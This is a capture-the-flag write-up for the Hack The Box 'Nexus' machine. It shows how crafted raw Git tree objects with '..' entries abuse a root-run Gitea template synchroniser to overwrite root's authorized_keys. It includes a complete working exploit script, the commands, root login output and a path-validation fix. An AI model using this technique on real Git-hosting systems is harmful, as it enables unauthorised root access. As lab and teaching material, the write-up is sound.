---
title: "Building a Malicious Git Tree: Nexus HTB Gitea Privilege Escalation"
published: 2026-08-20
description: "How raw Git objects bypassed path validation and turned a root-run template synchroniser into an arbitrary file write."
tags: [hack-the-box, ctf, web, gitea, git, privilege-escalation]
category: writeup
draft: false
---

# Building a Malicious Git Tree: Nexus HTB Gitea Privilege Escalation

## The idea

The most interesting part of Nexus was not the initial shell; it was the root escalation. The target ran a custom Gitea template synchroniser as root. It read file paths from a Git repository and copied the corresponding blob contents to a local staging directory.

The flaw was simple:

```python
target = os.path.join(stage_path, filepath)
with open(target, 'wb') as handle:
    handle.write(blob_contents)
```

`filepath` came from the repository. There was no validation that the final path remained under `stage_path`.

If I could make Git return a path containing `..`, the root process would write outside of the staging directory. The goal was to write my public key to `/root/.ssh/authorized_keys` and then SSH as root.

## The vulnerable service

The scheduled service was configured as follows:

```ini
[Unit]
Description=Sync Gitea templates
After=network-online.target

[Service]
Type=oneshot
User=root
ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py
TimeoutStartSec=50s
```

The script recursively listed the files in every template repository:

```python
result = subprocess.run(
    ['git', '-c', 'safe.directory=*', 'ls-tree', '-r', 'HEAD'],
    cwd=bare_path,
    capture_output=True,
    text=True,
    timeout=10,
)

for line in result.stdout.strip().split('\n'):
    meta, filepath = line.split('\t', 1)
    mode, objtype, objhash = meta.split()
    if objtype == 'blob':
        entries.append((mode, objhash, filepath))
```

It then created directories and copied each blob:

```python
for mode, objhash, filepath in entries:
    target = os.path.join(stage_path, filepath)
    os.makedirs(os.path.dirname(target), exist_ok=True)

    content = subprocess.run(
        ['git', '-c', 'safe.directory=*', 'cat-file', 'blob', objhash],
        cwd=bare_path,
        capture_output=True,
        timeout=10,
    ).stdout

    with open(target, 'wb') as handle:
        handle.write(content)
```

The missing security check was the entire vulnerability.

## Why normal Git commands were not enough

The obvious traversal path is:

```text
../../../../root/.ssh/authorized_keys
```

However, Git and Gitea do not allow a user to create a folder named `..` through ordinary commands or the web interface. That is a useful safety control, but the Git object database works at a lower level.

Git uses three important object types:

| Object | Meaning |
| --- | --- |
| Blob | The raw bytes of a file. |
| Tree | A directory listing of names, modes, and object IDs. |
| Commit | A reference to the root tree plus metadata. |

Every object is stored as:

```text
<type> <size>\0<content>
```

The SHA-1 of that byte sequence becomes the object ID. The compressed object is stored in `.git/objects/<first-two-characters>/<remaining-38-characters>`.

A tree entry contains a mode, a filename, and a binary object ID. If I write the object myself, the filename can be the literal byte sequence `..` even though the normal Git interface would reject it.

![Git tree output format](media/1_Bxmv4_SYQnurUEipZcL7kw.webp)

## The tree to build

The crafted repository needed to represent this structure:

```text
README.md
└── ..
    └── ..
        └── ..
            └── ..
                └── root
                    └── .ssh
                        └── authorized_keys
```

When the synchroniser combined this Git path with its intended destination, the final write became:

```text
/home/git/template-staging/jones/test/../../../../root/.ssh/authorized_keys
```

After path resolution, that is `/root/.ssh/authorized_keys`.

![Crafted Git tree](media/Pasted%20image%2020260820180846.png)

## Building the objects

First, I generated a key pair on the target as `jones`:

```bash
cd /tmp
ssh-keygen -t ed25519 -f /tmp/mykey -N ''
```

Next, I created a repository in Gitea and cloned it:

```bash
git clone http://jones:'y27xb3ha!!74GbR'@localhost:3000/jones/test.git
cd test
```

The Python script below creates the objects directly. `write_obj()` serialises and stores a Git object, while `entry()` creates a raw tree entry. The loop is the important part: it wraps the `root/.ssh/authorized_keys` tree in four entries named `..`.

```python
#!/usr/bin/env python3
import hashlib
import os
import subprocess
import sys
import time
import zlib


def write_obj(data, obj_type):
    """Create a compressed Git object and return its SHA-1."""
    header = ("%s %d" % (obj_type, len(data))).encode() + b"\x00"
    raw = header + data
    sha = hashlib.sha1(raw).hexdigest()
    directory = os.path.join(".git", "objects", sha[:2])
    os.makedirs(directory, exist_ok=True)
    path = os.path.join(directory, sha[2:])
    if not os.path.exists(path):
        with open(path, "wb") as handle:
            handle.write(zlib.compress(raw))
    return sha


def entry(mode, name, sha):
    """Return one raw Git tree entry."""
    return ("%s %s" % (mode, name)).encode() + b"\x00" + bytes.fromhex(sha)


if not os.path.isdir(".git"):
    sys.exit("Run inside a Git repository")

result = subprocess.run(["cat", "/tmp/mykey.pub"], capture_output=True, text=True)
if result.returncode != 0:
    sys.exit("Create /tmp/mykey.pub first with ssh-keygen")

# Blob: the contents of root's future authorized_keys file.
public_key = result.stdout.strip() + "\n"
key_blob = write_obj(public_key.encode(), "blob")

# Blob: a harmless file so the repository looks like a normal template.
readme_blob = write_obj(b"# Template\n", "blob")

# Trees: authorized_keys → .ssh → root.
ssh_tree = write_obj(entry("100644", "authorized_keys", key_blob), "tree")
current = write_obj(entry("40000", ".ssh", ssh_tree), "tree")
current = write_obj(entry("40000", "root", current), "tree")

# Wrap the tree in four forbidden path components.
for _ in range(4):
    current = write_obj(entry("40000", "..", current), "tree")

# Build the root tree and a commit that points to it.
root_tree = write_obj(
    entry("100644", "README.md", readme_blob) + entry("40000", "..", current),
    "tree",
)

timestamp = int(time.time())
commit = (
    "tree %s\n"
    "author x <x@x> %d +0000\n"
    "committer x <x@x> %d +0000\n\n"
    "init\n"
) % (root_tree, timestamp, timestamp)
commit_sha = write_obj(commit.encode(), "commit")

# Point main at the crafted commit.
os.makedirs(os.path.join(".git", "refs", "heads"), exist_ok=True)
with open(os.path.join(".git", "refs", "heads", "main"), "w") as handle:
    handle.write(commit_sha + "\n")

print("Done:", commit_sha)
```

## Triggering the synchroniser

With the raw objects in place, I forced the crafted branch to Gitea:

```bash
python3 exploit.py
git push -u origin main --force
```

The push output contained warnings that touched the intended traversal target:

```text
warning: unable to access '../../../../../root/.gitattributes': Permission denied
warning: unable to access '../../../../../root/.ssh/.gitattributes': Permission denied
```

Once the timer ran, the root service copied the public key into root's SSH directory. The final step was simply:

```bash
ssh -i /tmp/mykey root@localhost
```

```text
root@nexus:~# cat root.txt
997482990e3dd422393534f15d9ed5d5
```

## Defensive lesson

The appropriate fix is to run the synchroniser as an unprivileged account and constrain every output path to the staging directory:

```python
from pathlib import Path

base = Path(stage_path).resolve()
target = (base / filepath).resolve()

if target == base or base not in target.parents:
    raise ValueError(f"Unsafe template path: {filepath!r}")
```

Also reject absolute paths and `.` / `..` components before touching the filesystem. A Git tree, archive, package, or any other external format must never be treated as a trusted source of file paths.

## Main write-up

For the complete Nexus attack chain—from the exposed `.env` file through the initial web shell—see [Hack The Box: Nexus Write-up](Writeup.md).
